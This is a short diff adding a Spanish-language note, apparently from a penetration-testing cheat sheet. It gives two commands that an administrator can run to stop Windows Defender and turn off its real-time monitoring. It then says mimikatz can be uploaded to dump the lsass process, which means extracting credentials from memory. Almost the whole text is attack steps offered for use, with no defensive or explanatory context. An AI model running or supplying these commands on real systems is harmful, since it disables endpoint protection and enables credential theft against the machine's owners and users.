@@ -1,0 +1,6 @@
+Si eres usuario administrador (CMD)
+
+sc stop WinDefend
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+Después de esto ya se puede subir mimikatz para dumpear lsass
